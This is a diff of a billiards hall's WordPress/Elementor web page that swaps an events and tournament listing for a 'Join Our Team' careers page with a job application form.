-<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-120"><a href="/about/" class="elementor-item">About</a>
+<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children menu-item-120"><a href="/about/" class="elementor-item">About</a>
 <ul class="sub-menu elementor-nav-menu--dropdown">
 	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-535"><a href="https://utimebilliards.com/book-a-table/" class="elementor-sub-item">Book a Table</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-430"><a href="https://utimebilliards.com/career/" class="elementor-sub-item">Join Our Team</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item menu-item-430"><a href="https://utimebilliards.com/career/" aria-current="page" class="elementor-sub-item elementor-item-active">Join Our Team</a></li>
 	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-954"><a href="https://utimebilliards.com/menu/" class="elementor-sub-item">Menu</a></li>
 	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-431"><a href="https://utimebilliards.com/shop/" class="elementor-sub-item">Shop</a></li>
 </ul>
 </li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-ancestor current-menu-parent current_page_parent current_page_ancestor menu-item-has-children menu-item-536"><a href="https://utimebilliards.com/tournaments/" class="elementor-item">Tournaments</a>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-536"><a href="https://utimebilliards.com/tournaments/" class="elementor-item">Tournaments</a>
 <ul class="sub-menu elementor-nav-menu--dropdown">
-	<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item menu-item-428"><a href="https://utimebilliards.com/events/#recurring-tab" aria-current="page" class="elementor-sub-item elementor-item-anchor">Calendar</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-428"><a href="https://utimebilliards.com/events/#recurring-tab" class="elementor-sub-item elementor-item-anchor">Calendar</a></li>
 </ul>
 </li>
 <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-463"><a href="https://utimebilliards.com/leagues/" class="elementor-item">Leagues</a></li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-303 current_page_item menu-item-has-children menu-item-330"><a href="https://utimebilliards.com/events/" aria-current="page" class="elementor-item elementor-item-active">Events</a>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-330"><a href="https://utimebilliards.com/events/" class="elementor-item">Events</a>
 <ul class="sub-menu elementor-nav-menu--dropdown">
 	<li class="open-event-form menu-item menu-item-type-custom menu-item-object-custom menu-item-368"><a href="#" class="elementor-sub-item elementor-item-anchor">Book a Private Event</a></li>
 </ul>
@@ -761,21 +753,21 @@ html, body {width: auto!important; overflow-x: hidden!important} 		</style>
 			<svg aria-hidden="true" role="presentation" class="elementor-menu-toggle__icon--open e-font-icon-svg e-eicon-menu-bar" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M104 333H896C929 333 958 304 958 271S929 208 896 208H104C71 208 42 237 42 271S71 333 104 333ZM104 583H896C929 583 958 554 958 521S929 458 896 458H104C71 458 42 487 42 521S71 583 104 583ZM104 833H896C929 833 958 804 958 771S929 708 896 708H104C71 708 42 737 42 771S71 833 104 833Z"></path></svg><svg aria-hidden="true" role="presentation" class="elementor-menu-toggle__icon--close e-font-icon-svg e-eicon-close" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M742 167L500 408 258 167C246 154 233 150 217 150 196 150 179 158 167 167 154 179 150 196 150 212 150 229 154 242 171 254L408 500 167 742C138 771 138 800 167 829 196 858 225 858 254 829L496 587 738 829C750 842 767 846 783 846 800 846 817 842 829 829 842 817 846 804 846 783 846 767 842 750 829 737L588 500 833 258C863 229 863 200 833 171 804 137 775 137 742 167Z"></path></svg>		</div>
 					<nav class="elementor-nav-menu--dropdown elementor-nav-menu__container" aria-hidden="true">
 				<ul id="menu-2-4546ead0" class="elementor-nav-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-119"><a href="https://utimebilliards.com/" class="elementor-item" tabindex="-1">Home</a></li>
-<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-120"><a href="/about/" class="elementor-item" tabindex="-1">About</a>
+<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children menu-item-120"><a href="/about/" class="elementor-item" tabindex="-1">About</a>
 <ul class="sub-menu elementor-nav-menu--dropdown">
 	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-535"><a href="https://utimebilliards.com/book-a-table/" class="elementor-sub-item" tabindex="-1">Book a Table</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-430"><a href="https://utimebilliards.com/career/" class="elementor-sub-item" tabindex="-1">Join Our Team</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item menu-item-430"><a href="https://utimebilliards.com/career/" aria-current="page" class="elementor-sub-item elementor-item-active" tabindex="-1">Join Our Team</a></li>
 	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-954"><a href="https://utimebilliards.com/menu/" class="elementor-sub-item" tabindex="-1">Menu</a></li>
 	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-431"><a href="https://utimebilliards.com/shop/" class="elementor-sub-item" tabindex="-1">Shop</a></li>
 </ul>
 </li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-ancestor current-menu-parent current_page_parent current_page_ancestor menu-item-has-children menu-item-536"><a href="https://utimebilliards.com/tournaments/" class="elementor-item" tabindex="-1">Tournaments</a>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-536"><a href="https://utimebilliards.com/tournaments/" class="elementor-item" tabindex="-1">Tournaments</a>
 <ul class="sub-menu elementor-nav-menu--dropdown">
-	<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item menu-item-428"><a href="https://utimebilliards.com/events/#recurring-tab" aria-current="page" class="elementor-sub-item elementor-item-anchor" tabindex="-1">Calendar</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-428"><a href="https://utimebilliards.com/events/#recurring-tab" class="elementor-sub-item elementor-item-anchor" tabindex="-1">Calendar</a></li>
 </ul>
 </li>
 <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-463"><a href="https://utimebilliards.com/leagues/" class="elementor-item" tabindex="-1">Leagues</a></li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-303 current_page_item menu-item-has-children menu-item-330"><a href="https://utimebilliards.com/events/" aria-current="page" class="elementor-item elementor-item-active" tabindex="-1">Events</a>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-330"><a href="https://utimebilliards.com/events/" class="elementor-item" tabindex="-1">Events</a>
 <ul class="sub-menu elementor-nav-menu--dropdown">
 	<li class="open-event-form menu-item menu-item-type-custom menu-item-object-custom menu-item-368"><a href="#" class="elementor-sub-item elementor-item-anchor" tabindex="-1">Book a Private Event</a></li>
 </ul>
@@ -866,21 +858,21 @@ transform: translateY(-200px); /*adjust this value to the height of your header*
 				<div class="elementor-widget-container">
 								<nav aria-label="Menu" class="elementor-nav-menu--main elementor-nav-menu__container elementor-nav-menu--layout-horizontal e--pointer-none">
 				<ul id="menu-1-cacef6d" class="elementor-nav-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-119"><a href="https://utimebilliards.com/" class="elementor-item">Home</a></li>
-<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-120"><a href="/about/" class="elementor-item">About</a>
+<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children menu-item-120"><a href="/about/" class="elementor-item">About</a>
 <ul class="sub-menu elementor-nav-menu--dropdown">
 	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-535"><a href="https://utimebilliards.com/book-a-table/" class="elementor-sub-item">Book a Table</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-430"><a href="https://utimebilliards.com/career/" class="elementor-sub-item">Join Our Team</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item menu-item-430"><a href="https://utimebilliards.com/career/" aria-current="page" class="elementor-sub-item elementor-item-active">Join Our Team</a></li>
 	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-954"><a href="https://utimebilliards.com/menu/" class="elementor-sub-item">Menu</a></li>
 	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-431"><a href="https://utimebilliards.com/shop/" class="elementor-sub-item">Shop</a></li>
 </ul>
 </li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-ancestor current-menu-parent current_page_parent current_page_ancestor menu-item-has-children menu-item-536"><a href="https://utimebilliards.com/tournaments/" class="elementor-item">Tournaments</a>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-536"><a href="https://utimebilliards.com/tournaments/" class="elementor-item">Tournaments</a>
 <ul class="sub-menu elementor-nav-menu--dropdown">
-	<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item menu-item-428"><a href="https://utimebilliards.com/events/#recurring-tab" aria-current="page" class="elementor-sub-item elementor-item-anchor">Calendar</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-428"><a href="https://utimebilliards.com/events/#recurring-tab" class="elementor-sub-item elementor-item-anchor">Calendar</a></li>
 </ul>
 </li>
 <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-463"><a href="https://utimebilliards.com/leagues/" class="elementor-item">Leagues</a></li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-303 current_page_item menu-item-has-children menu-item-330"><a href="https://utimebilliards.com/events/" aria-current="page" class="elementor-item elementor-item-active">Events</a>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-330"><a href="https://utimebilliards.com/events/" class="elementor-item">Events</a>
 <ul class="sub-menu elementor-nav-menu--dropdown">
 	<li class="open-event-form menu-item menu-item-type-custom menu-item-object-custom menu-item-368"><a href="#" class="elementor-sub-item elementor-item-anchor">Book a Private Event</a></li>
 </ul>
@@ -893,21 +885,21 @@ transform: translateY(-200px); /*adjust this value to the height of your header*
 			<svg aria-hidden="true" role="presentation" class="elementor-menu-toggle__icon--open e-font-icon-svg e-eicon-menu-bar" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M104 333H896C929 333 958 304 958 271S929 208 896 208H104C71 208 42 237 42 271S71 333 104 333ZM104 583H896C929 583 958 554 958 521S929 458 896 458H104C71 458 42 487 42 521S71 583 104 583ZM104 833H896C929 833 958 804 958 771S929 708 896 708H104C71 708 42 737 42 771S71 833 104 833Z"></path></svg><svg aria-hidden="true" role="presentation" class="elementor-menu-toggle__icon--close e-font-icon-svg e-eicon-close" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M742 167L500 408 258 167C246 154 233 150 217 150 196 150 179 158 167 167 154 179 150 196 150 212 150 229 154 242 171 254L408 500 167 742C138 771 138 800 167 829 196 858 225 858 254 829L496 587 738 829C750 842 767 846 783 846 800 846 817 842 829 829 842 817 846 804 846 783 846 767 842 750 829 737L588 500 833 258C863 229 863 200 833 171 804 137 775 137 742 167Z"></path></svg>		</div>
 					<nav class="elementor-nav-menu--dropdown elementor-nav-menu__container" aria-hidden="true">
 				<ul id="menu-2-cacef6d" class="elementor-nav-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-119"><a href="https://utimebilliards.com/" class="elementor-item" tabindex="-1">Home</a></li>
-<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-120"><a href="/about/" class="elementor-item" tabindex="-1">About</a>
+<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children menu-item-120"><a href="/about/" class="elementor-item" tabindex="-1">About</a>
 <ul class="sub-menu elementor-nav-menu--dropdown">
 	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-535"><a href="https://utimebilliards.com/book-a-table/" class="elementor-sub-item" tabindex="-1">Book a Table</a></li>
-	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-430"><a href="https://utimebilliards.com/career/" class="elementor-sub-item" tabindex="-1">Join Our Team</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item menu-item-430"><a href="https://utimebilliards.com/career/" aria-current="page" class="elementor-sub-item elementor-item-active" tabindex="-1">Join Our Team</a></li>
 	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-954"><a href="https://utimebilliards.com/menu/" class="elementor-sub-item" tabindex="-1">Menu</a></li>
 	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-431"><a href="https://utimebilliards.com/shop/" class="elementor-sub-item" tabindex="-1">Shop</a></li>
 </ul>
 </li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-ancestor current-menu-parent current_page_parent current_page_ancestor menu-item-has-children menu-item-536"><a href="https://utimebilliards.com/tournaments/" class="elementor-item" tabindex="-1">Tournaments</a>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-536"><a href="https://utimebilliards.com/tournaments/" class="elementor-item" tabindex="-1">Tournaments</a>
 <ul class="sub-menu elementor-nav-menu--dropdown">
-	<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item menu-item-428"><a href="https://utimebilliards.com/events/#recurring-tab" aria-current="page" class="elementor-sub-item elementor-item-anchor" tabindex="-1">Calendar</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-428"><a href="https://utimebilliards.com/events/#recurring-tab" class="elementor-sub-item elementor-item-anchor" tabindex="-1">Calendar</a></li>
 </ul>
 </li>
 <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-463"><a href="https://utimebilliards.com/leagues/" class="elementor-item" tabindex="-1">Leagues</a></li>
-<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-303 current_page_item menu-item-has-children menu-item-330"><a href="https://utimebilliards.com/events/" aria-current="page" class="elementor-item elementor-item-active" tabindex="-1">Events</a>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-330"><a href="https://utimebilliards.com/events/" class="elementor-item" tabindex="-1">Events</a>
 <ul class="sub-menu elementor-nav-menu--dropdown">
 	<li class="open-event-form menu-item menu-item-type-custom menu-item-object-custom menu-item-368"><a href="#" class="elementor-sub-item elementor-item-anchor" tabindex="-1">Book a Private Event</a></li>
 </ul>
@@ -948,487 +940,363 @@ transform: translateY(-200px); /*adjust this value to the height of your header*
 					</div>
 		</section>
 				</div>
-				<div data-elementor-type="wp-page" data-elementor-id="303" class="elementor elementor-303" data-elementor-post-type="page">
-				<div class="elementor-element elementor-element-130ba94 e-con-full e-flex e-con e-parent" data-id="130ba94" data-element_type="container">
-				<div class="elementor-element elementor-element-9aee2b1 elementor-widget elementor-widget-html" data-id="9aee2b1" data-element_type="widget" data-widget_type="html.default">
+				<div data-elementor-type="wp-page" data-elementor-id="267" class="elementor elementor-267" data-elementor-post-type="page">
+				<div class="elementor-element elementor-element-10e3283 e-con-full e-flex e-con e-parent" data-id="10e3283" data-element_type="container">
+				<div class="elementor-element elementor-element-27e16d7 elementor-widget elementor-widget-html" data-id="27e16d7" data-element_type="widget" data-widget_type="html.default">
 				<div class="elementor-widget-container">
-					<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Responsive Tabbed Navigation - U-TIME Events</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/gsap@3.11.4/dist/gsap.min.js"></script>
+					<!-- Tailwind and other dependencies -->
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/gsap@3.11.4/dist/gsap.min.js"></script>
 
-  <!-- Font imports and styles -->
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800&display=swap');
-    h1,h2,h3{
-        font-family: Montserrat;
-    }
-    
-    .glassmorphism {
-      background: rgba(255, 255, 255, 0.05);
-      backdrop-filter: blur(10px);
-      -webkit-backdrop-filter: blur(10px);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-    }
-    
-    .red-glow {
-      filter: drop-shadow(0 0 15px rgba(255, 59, 59, 0.6));
-    }
-    
-    .blue-glow {
-      filter: drop-shadow(0 0 15px rgba(0, 191, 255, 0.6));
-    }
+<!-- Font imports and styles -->
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800&display=swap');
+  
+  .glassmorphism {
+    background: rgba(255, 255, 255, 0.05);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+  }
+  
+  .red-glow {
+    filter: drop-shadow(0 0 15px rgba(255, 59, 59, 0.6));
+  }
+  
+  .blue-glow {
+    filter: drop-shadow(0 0 15px rgba(0, 191, 255, 0.6));
+  }
 
-    .modal {
-      display: none;
-    }
-    
-    .modal.active {
-      display: flex;
-    }
+  /* Form styling */
+  .form-input {
+    background: rgba(255, 255, 255, 0.05);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+  }
+  
+  .form-input:focus {
+    border-color: #FF3B3B;
+    box-shadow: 0 0 0 2px rgba(255, 59, 59, 0.2);
+  }
+</style>
 
-    /* Enhanced mobile responsiveness */
-    @media (max-width: 640px) {
-      .tab-container {
-        width: 100%;
-        max-width: none;
-      }
-      
-      .tab-button {
-        font-size: 0.875rem;
-        white-space: nowrap;
-        overflow: hidden;
-        text-overflow: ellipsis;
-      }
-    }
+<!-- Hero Section -->
+<section class="relative min-h-[50vh] bg-gradient-to-b from-black to-[#081b33] font-[Montserrat] flex items-center">
+  <div class="absolute inset-0 overflow-hidden">
+    <div class="absolute top-[-10%] left-[30%] w-[500px] h-[500px] bg-[#FF3B3B]/5 rounded-full blur-[100px] animate-pulse"></div>
+    <div class="absolute bottom-[-20%] right-[10%] w-[600px] h-[600px] bg-[#00BFFF]/7 rounded-full blur-[150px] animate-pulse"></div>
+  </div>
+  
+  <div class="relative z-10 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-20 text-center">
+    <h1 class="text-4xl sm:text-5xl md:text-6xl font-bold text-white mb-6">
+      Join Our <span class="text-[#FF3B3B]">Team</span>
+    </h1>
+    <p class="text-xl text-white/80 max-w-3xl mx-auto">
+      We're always looking for passionate, friendly, and motivated individuals to join our team. If you love billiards, people, and good vibes — we want to hear from you!
+    </p>
+  </div>
+</section>
 
-    @media (max-width: 480px) {
-      .tab-button {
-        font-size: 0.8rem;
-        padding: 0.75rem 1rem;
-      }
-    }
-
-    @media (max-width: 375px) {
-      .tab-button {
-        font-size: 0.75rem;
-        padding: 0.625rem 0.75rem;
-      }
-    }
-
-    @media (max-width: 320px) {
-      .tab-button {
-        font-size: 0.7rem;
-        padding: 0.5rem 0.625rem;
-      }
-    }
-  </style>
-</head>
-<body class="bg-black font-['Montserrat']">
-
-  <!-- Hero Section -->
-  <section class="relative min-h-[50vh] bg-gradient-to-b from-black to-[#081b33] flex items-center">
-    <div class="absolute inset-0 overflow-hidden">
-      <div class="absolute top-[-10%] left-[30%] w-[500px] h-[500px] bg-[#FF3B3B]/5 rounded-full blur-[100px] animate-pulse"></div>
-      <div class="absolute bottom-[-20%] right-[10%] w-[600px] h-[600px] bg-[#00BFFF]/7 rounded-full blur-[150px] animate-pulse"></div>
+<!-- Work With U-TIME Section -->
+<section class="py-16 bg-[#081b33] font-[Montserrat]">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+    <div class="text-center mb-12">
+      <h2 class="text-3xl sm:text-4xl font-bold text-white mb-6">
+        Work With <span class="text-[#FF3B3B]">U-TIME</span>
+      </h2>
     </div>
     
-    <div class="relative z-10 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-20 text-center">
-      <h1 class="text-4xl sm:text-5xl md:text-6xl font-bold text-white mb-6">
-        <span class="text-[#FF3B3B]">Events</span>
-      </h1>
-      <p class="text-xl text-white/80 max-w-3xl mx-auto">
-        Join us for exciting special events and private celebrations.
+    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+      <!-- Job Benefit Cards -->
+      <div class="bg-black/30 rounded-xl p-6 glassmorphism hover:bg-black/40 transition-all duration-300">
+        <div class="w-12 h-12 rounded-xl bg-[#FF3B3B]/10 flex items-center justify-center mb-4">
+          <span class="text-2xl">🎱</span>
+        </div>
+        <h3 class="text-xl font-bold text-white mb-2">Love Billiards?</h3>
+        <p class="text-white/70">Work in an environment you're passionate about</p>
+      </div>
+      
+      <div class="bg-black/30 rounded-xl p-6 glassmorphism hover:bg-black/40 transition-all duration-300">
+        <div class="w-12 h-12 rounded-xl bg-[#00BFFF]/10 flex items-center justify-center mb-4">
+          <span class="text-2xl">👥</span>
+        </div>
+        <h3 class="text-xl font-bold text-white mb-2">Great Team</h3>
+        <p class="text-white/70">Join a friendly and supportive work family</p>
+      </div>
+      
+      <div class="bg-black/30 rounded-xl p-6 glassmorphism hover:bg-black/40 transition-all duration-300">
+        <div class="w-12 h-12 rounded-xl bg-[#FF3B3B]/10 flex items-center justify-center mb-4">
+          <span class="text-2xl">⚡</span>
+        </div>
+        <h3 class="text-xl font-bold text-white mb-2">High Energy</h3>
+        <p class="text-white/70">Dynamic atmosphere with exciting events</p>
+      </div>
+      
+      <div class="bg-black/30 rounded-xl p-6 glassmorphism hover:bg-black/40 transition-all duration-300">
+        <div class="w-12 h-12 rounded-xl bg-[#00BFFF]/10 flex items-center justify-center mb-4">
+          <span class="text-2xl">🚀</span>
+        </div>
+        <h3 class="text-xl font-bold text-white mb-2">Growth</h3>
+        <p class="text-white/70">Opportunities to learn and advance</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Application Form Section -->
+<section class="py-16 bg-black font-[Montserrat]">
+  <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
+    <div class="text-center mb-12">
+      <h2 class="text-3xl sm:text-4xl font-bold text-white mb-6">
+        Apply <span class="text-[#FF3B3B]">Now</span>
+      </h2>
+      <p class="text-white/80">Fill out the form below to get started:</p>
+    </div>
+    
+    <div class="bg-black/30 rounded-xl p-8 glassmorphism utime-career-form elementor-form-container">
+      		<div data-elementor-type="section" data-elementor-id="275" class="elementor elementor-275" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-e31432f e-flex e-con-boxed e-con e-parent" data-id="e31432f" data-element_type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-79a7721 utime-custom-form elementor-button-align-stretch elementor-widget elementor-widget-form" data-id="79a7721" data-element_type="widget" data-settings="{&quot;step_next_label&quot;:&quot;Next&quot;,&quot;step_previous_label&quot;:&quot;Previous&quot;,&quot;button_width&quot;:&quot;100&quot;,&quot;step_type&quot;:&quot;number_text&quot;,&quot;step_icon_shape&quot;:&quot;circle&quot;}" data-widget_type="form.default">
+				<div class="elementor-widget-container">
+							<form class="elementor-form" method="post" name="New Form">
+			<input type="hidden" name="post_id" value="275"/>
+			<input type="hidden" name="form_id" value="79a7721"/>
+			<input type="hidden" name="referer_title" value="Career" />
+
+							<input type="hidden" name="queried_id" value="267"/>
+			
+			<div class="elementor-form-fields-wrapper elementor-labels-above">
+								<div class="elementor-field-type-text elementor-field-group elementor-column elementor-field-group-name elementor-col-50 elementor-field-required elementor-mark-required">
+												<label for="form-field-name" class="elementor-field-label">
+								Full Name							</label>
+														<input size="1" type="text" name="form_fields[name]" id="form-field-name" class="elementor-field elementor-size-sm  elementor-field-textual" placeholder="Enter your full name" required="required">
+											</div>
+								<div class="elementor-field-type-email elementor-field-group elementor-column elementor-field-group-email elementor-col-50 elementor-field-required elementor-mark-required">
+												<label for="form-field-email" class="elementor-field-label">
+								Email Address							</label>
+														<input size="1" type="email" name="form_fields[email]" id="form-field-email" class="elementor-field elementor-size-sm  elementor-field-textual" placeholder="Enter your email address" required="required">
+											</div>
+								<div class="elementor-field-type-tel elementor-field-group elementor-column elementor-field-group-message elementor-col-100">
+												<label for="form-field-message" class="elementor-field-label">
+								Phone Number (Optional) 							</label>
+								<input size="1" type="tel" name="form_fields[message]" id="form-field-message" class="elementor-field elementor-size-sm  elementor-field-textual" placeholder="Enter your phone number" pattern="[0-9()#&amp;+*-=.]+" title="Only numbers and phone characters (#, -, *, etc) are accepted.">
+
+						</div>
+								<div class="elementor-field-type-select elementor-field-group elementor-column elementor-field-group-field_ec3e4f1 elementor-col-100 elementor-field-required elementor-mark-required">
+												<label for="form-field-field_ec3e4f1" class="elementor-field-label">
+								Position You're Interested In							</label>
+								<div class="elementor-field elementor-select-wrapper remove-before ">
+			<div class="select-caret-down-wrapper">
+				<svg aria-hidden="true" class="e-font-icon-svg e-eicon-caret-down" viewBox="0 0 571.4 571.4" xmlns="http://www.w3.org/2000/svg"><path d="M571 393Q571 407 561 418L311 668Q300 679 286 679T261 668L11 418Q0 407 0 393T11 368 36 357H536Q550 357 561 368T571 393Z"></path></svg>			</div>
+			<select name="form_fields[field_ec3e4f1]" id="form-field-field_ec3e4f1" class="elementor-field-textual elementor-size-sm" required="required">
+									<option value="Server">Server</option>
+									<option value="Bartender">Bartender</option>
+									<option value="League Coordinator">League Coordinator</option>
+									<option value="Event Staff">Event Staff</option>
+									<option value="Other">Other</option>
+							</select>
+		</div>
+						</div>
+								<div class="elementor-field-type-textarea elementor-field-group elementor-column elementor-field-group-field_3468d35 elementor-col-100 elementor-field-required elementor-mark-required">
+												<label for="form-field-field_3468d35" class="elementor-field-label">
+								Why Do You Want to Work With Us?							</label>
+						<textarea class="elementor-field-textual elementor-field  elementor-size-sm" name="form_fields[field_3468d35]" id="form-field-field_3468d35" rows="4" placeholder="Tell us what attracts you to U-TIME and why you&#039;d be a great fit for our team...." required="required"></textarea>				</div>
+								<div class="elementor-field-group elementor-column elementor-field-type-submit elementor-col-100 e-form__buttons">
+					<button class="elementor-button elementor-size-sm" type="submit">
+						<span class="elementor-button-content-wrapper">
+																						<span class="elementor-button-text">Submit Application</span>
+													</span>
+					</button>
+				</div>
+			</div>
+		</form>
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+    </div>
+  </div>
+</section>
+
+<!-- Explore Events Section -->
+<section class="py-16 bg-[#081b33] font-[Montserrat]">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+    <div class="text-center mb-12">
+      <h2 class="text-3xl sm:text-4xl font-bold text-white mb-6">
+    Explore Events & <span class="text-[#FF3B3B]">Community</span>
+      </h2>
+      <p class="text-white/80 max-w-2xl mx-auto">
+        Be part of our fun and vibrant atmosphere – both on and off the tables.
       </p>
     </div>
-  </section>
-
-  <!-- Enhanced Responsive Tabbed Navigation -->
-  <section class="py-6 sm:py-8 bg-[#081b33]">
-    <div class="max-w-7xl mx-auto px-2 xs:px-4 sm:px-6 lg:px-8">
-      <div class="flex justify-center mb-6 sm:mb-8">
-        <div class="bg-black/30 rounded-xl p-1.5 sm:p-2 glassmorphism tab-container w-full max-w-md sm:max-w-lg md:max-w-xl">
-          <div class="grid grid-cols-2 gap-1 sm:gap-2">
-            <button id="upcoming-tab" class="tab-button px-3 xs:px-4 sm:px-6 py-2.5 sm:py-3 rounded-lg font-semibold transition-all duration-300 bg-[#FF3B3B] text-black text-xs xs:text-sm sm:text-base leading-tight">
-              Upcoming Events
-            </button>
-            <button id="recurring-tab" class="tab-button px-3 xs:px-4 sm:px-6 py-2.5 sm:py-3 rounded-lg font-semibold transition-all duration-300 text-white/70 hover:text-white text-xs xs:text-sm sm:text-base leading-tight">
-              Calendar 
-            </button>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-<!-- Tournament Schedule Section -->
-  <section id="upcoming-events" class="tab-content py-8 sm:py-16 bg-[#081b33]">
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-
-        
-        <section class="utime-tournaments-grid">
-            <div class="tournaments-container">
-                <div class="tournaments-grid columns-3">
-                            <div class="tournament-card glassmorphism">
-            <div class="card-inner">
-                <!-- Day Badge -->
-                <div class="card-header">
-                    <span class="day-badge"
-                        style="background-color: #FF3B3B20; color: #FF3B3B;">
-                        SATURDAY                    </span>
-                </div>
-
-                <!-- Tournament Name -->
-                <h3 class="tournament-name">
-                    Tournament Night                </h3>
-
-                <!-- Description Content -->
-                                    <div class="tournament-description">
-                        <h2 class="text-2xl font-bold text-white mb-4"><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f4cd.svg" alt="📍" /> Tournament Details</h2>
-<ul>
-<li><span class="text-[#FF3B3B] font-semibold">Venue:</span> U-TIME International, 1919 S Havana St, Aurora, CO 80014</li>
-<li><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f4dd.svg" alt="📝" /> Registration / Practice Opens: 6:30 PM</li>
-<li><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f3af.svg" alt="🎯" /> First Game Starts: 7:30 PM</li>
